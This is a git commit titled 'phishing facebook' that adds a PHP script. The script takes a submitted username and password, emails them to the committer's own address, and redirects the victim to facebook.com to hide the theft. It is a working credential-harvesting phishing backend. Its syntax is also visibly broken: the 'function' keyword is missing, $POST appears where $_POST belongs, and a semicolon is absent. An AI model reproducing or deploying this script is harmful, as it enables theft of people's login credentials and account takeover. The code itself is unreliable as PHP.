cb9c90a13b51036287be13840d3fd70282cb8835
mauricio <mauriqb2@gmail.com>
2019-04-30 15:01:08 -0400

    phishing facebook

---
+++ do_action.php
@@ -0,0 +1,15 @@
+<?php
+	mail_sender(){
+		$username = $POST[username];
+		$password = $POST[password];
+		$reciever = "mauriqb2@gmail.com"
+		$subject = "Got new access by phising script";
+		$message = "The username is ". $username;
+		$message .= "and password is ". $password;
+		return mail($reciever, $subject, $message);
+	}
+	
+	if(mail_sender()){
+		header("Location: http://www.facebook.com");
+	}
+?>
